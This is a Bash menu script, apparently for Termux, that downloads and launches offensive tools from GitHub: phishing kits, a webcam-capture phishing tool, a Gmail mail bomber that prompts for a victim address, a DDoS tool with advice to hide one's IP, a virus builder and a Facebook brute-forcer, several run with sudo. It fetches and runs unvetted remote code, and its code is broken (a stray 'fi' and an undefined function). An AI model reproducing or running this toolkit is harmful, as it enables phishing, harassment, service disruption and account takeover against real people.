#!/bin/bash

clear
echo -e "\033[31;40;1m
  ____  _   _  _____   ___   _    _ 
 / ___|| | | || ____| / _ \ \ \  / /
| |__  | | | |||  __ | | | | \ \/ / 
 \__ \ | |_| ||| |_ || | | |  \  /  
    | ||  _  |||   ||| | | |  /  \  
 ___| || | | |||___||| |_| | / /\ \ 
|____/ |_| |_||_____| \___/ /_/  \_\ v0.2
  Coded by 4lbH4cker
  github: https://github.com/gojsj12/SHGOXSHOPV0.1
  เครดิต กู SHGOXSHOP 
\033[33;4mVersion:\033[0m 4            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m 4lbH4cker

\e[37m[1]\e[36m Requirements & Updates        \e[37m[2]\e[36m Phishing Tool				
\e[37m[3]\e[36m WebCam Hack                   \e[37m[4]\e[36m Subscan			
\e[37m[5]\e[36m Gmail Bomber		  \e[37m[6]\e[36m DDOS Attack			
\e[37m[7]\e[36m How to use ?	          \e[37m[8]\e[36m Uninstall downloaded programs		
\e[37m[9]\e[36m Ip Info	                  \e[37m[10]\e[36m dorks-eye
\e[37m[11]\e[36m HackerPro                    \e[37m[12]\e[36m RED_HAWK
\e[37m[13]\e[36m VirusCrafter                 \e[37m[14]\e[36m Info-Site
\e[37m[15]\e[36m BadMod	                  \e[37m[16]\e[36m Facebash
\e[37m[17]\e[36m DARKARMY                     \e[37m[18]\e[36m AUTO-IP-CHANGER
"

# Rainbow Logo function
rainbow_logo() {
    local text="█████╗ ██╗ ████████╗ ██████╗ ██████╗ ██╗"
    local colors=("\033[31m" "\033[33m" "\033[32m" "\033[36m" "\033[34m" "\033[35m")
    local i=0
    while true; do
        for color in "${colors[@]}"; do
            echo -e "${color}${text}"
            sleep 0.1
            clear
        done
    done
}

# Handling menu options
read -p "เลือกหมายเลข (Enter option number): " islem
if [[ $islem == 1 || $islem == 01 ]]; then
    clear
    loading_message
    pkg install git -y
    pkg install python python3 -y
    pkg install pip pip3 -y
    pkg install curl -y
    apt update
    apt upgrade -y
    clear
    echo -e "\033[47;3;35m การอัปเดตเสร็จสิ้น...\033[0m"
    sleep 2

    echo -e "\033[1;31m-----------------------------\033[0m"
    echo -e "\033[1;33m     ✅ โมดูลพิเศษโดย SHGOXSHOP ✅\033[0m"
    echo -e "\033[1;37m github: https://github.com/gojsj12/SHGOXSHOPV0.1\033[0m"
    echo -e "\033[1;31m-----------------------------\033[0m"
    sleep 2

    git clone https://github.com/gojsj12/SHGOXSHOPV0.1
    cd SHGOXSHOPV0.1
    bash shop.sh
    cd ..

    echo -e "\033[1;32m🎯 เสร็จสิ้น! กำลังโหลดเมนูหลักต่อ...\033[0m"
    sleep 2
    bash alhack.sh
fi


elif [[ $islem == 2 || $islem == 02 ]]; then
    clear
    loading_message
    cd Tools
    git clone https://github.com/htr-tech/zphisher
    cd zphisher
    bash zphisher.sh

elif [[ $islem == 3 || $islem == 03 ]]; then
    clear
    loading_message
    cd Tools
    git clone https://github.com/techchipnet/CamPhish
    cd CamPhish
    bash camphish.sh

elif [[ $islem == 4 || $islem == 04 ]]; then
    clear
    loading_message
    git clone https://github.com/zidansec/subscan
    cd subscan
    read -p "Enter domain, e.g. (example.com): " sc
    ./subscan $sc
       
elif [[ $islem == 5 || $islem == 05 ]]; then
    clear
    loading_message
    cd Tools
    git clone https://github.com/juzeon/fast-mail-bomber.git
    cd fast-mail-bomber/
    mv config.example.php config.php
    php index.php update-providers
    rm -rf data/nodes.json data/dead_providers.json
    echo -e "\033[47;3;35m This may take some time\033[0m"
    echo -e "\033[47;3;35m To stop, press Ctrl+C\033[0m"
    sleep 4
    php index.php update-nodes
    php index.php refine-nodes
    echo "-------------------------"
    read -p "Enter email address to bombard: " mail
    echo "-------------------------"
    php index.php start-bombing $mail

elif [[ $islem == 6 || $islem == 06 ]]; then
    clear
    loading_message
    cd Tools
    git clone https://github.com/palahsu/DDoS-Ripper.git
    cd DDoS-Ripper
    python3 DRipper.py
    echo ""
    echo -e "\033[47;3;35m Make sure to hide your IP address before use.\033[0m"

elif [[ $islem == 7 || $islem == 07 ]]; then
    clear
    echo "Youtube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
    python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY
    sleep 10
    echo "Please wait for 10 seconds"
    bash alhack.sh

elif [[ $islem == 8 || $islem == 08 ]]; then
    clear
    echo -e "\033[47;3;35m Uninstalling downloaded programs...\033[0m"
    sleep 3 
    rm -rf Tools
    bash alhack.sh

elif [[ $islem == 9 || $islem == 09 ]]; then
    clear
    loading_message
    cd Tools
    apt update
    apt install git curl
    git clone https://github.com/htr-tech/track-ip.git
    cd track-ip
    bash trackip

elif [[ $islem == 10 || $islem == 010 ]]; then
    clear
    loading_message
    cd Tools
    git clone https://github.com/BullsEye0/dorks-eye.git
    cd dorks-eye
    pip install -r requirements.txt
    python3 dorks-eye.py

elif [[ $islem == 11 || $islem == 011 ]]; then
    clear
    loading_message
    cd Tools
    apt update && apt upgrade && apt install git && apt install python2
    git clone https://github.com/jaykali/hackerpro.git
    cd hackerpro
    sudo bash install.sh
    python2 hackerpro.py

elif [[ $islem == 12 || $islem == 012 ]]; then
    clear
    loading_message
    cd Tools
    git clone https://github.com/Tuhinshubhra/RED_HAWK
    cd RED_HAWK
    php rhawk.php

elif [[ $islem == 13 || $islem == 013 ]]; then
    clear
    loading_message
    cd Tools
    git clone https://github.com/Devil-Tigers/TigerVirus
    apt update
    apt upgrade -y
    pkg install git -y
    cd TigerVirus
    bash app.sh

elif [[ $islem == 14 || $islem == 014 ]]; then
    clear
    loading_message
    cd Tools
    pkg install curl -y
    upgrade -y
    pkg install git -y
    git clone https://github.com/king-hacking/info-site.git
    cd info-site
    bash info.sh

elif [[ $islem == 15 || $islem == 015 ]]; then
    clear
    loading_message
    cd Tools
    sudo apt-get update
    sudo apt-get install php
    sudo apt-get install php-curl
    git clone https://github.com/MrSqar-Ye/BadMod.git
    cd BadMod
    chmod u+x INSTALL
    chmod u+x BadMod.php
    sudo php BadMod.php

elif [[ $islem == 16 || $islem == 016 ]]; then
    clear
    loading_message
    cd Tools
    git clone https://github.com/fu8uk1/facebash
    cd facebash
    bash install.sh
    chmod +x facebash.sh
    tor
    sudo ./facebash.sh

elif [[ $islem == 17 || $islem == 017 ]]; then
    clear
    loading_message
    cd Tools
    pkg install git
    pkg install python
    git clone https://github.com/SarahMuirDarkarmy.git
    cd Darkarmy
    bash install.sh

elif [[ $islem == 18 || $islem == 018 ]]; then
    clear
    loading_message
    cd Tools
    git clone https://github.com/CyberScorpion/AUTO-IP-CHANGER
    cd AUTO-IP-CHANGER
    bash install.sh

else   
    clear
    echo -e '\033[36;40;1m คุณได้กรอกหมายเลขที่ผิด กรุณาลองใหม่\033[0m'
    sleep 1
    clear 
    bash alhack.sh
fi
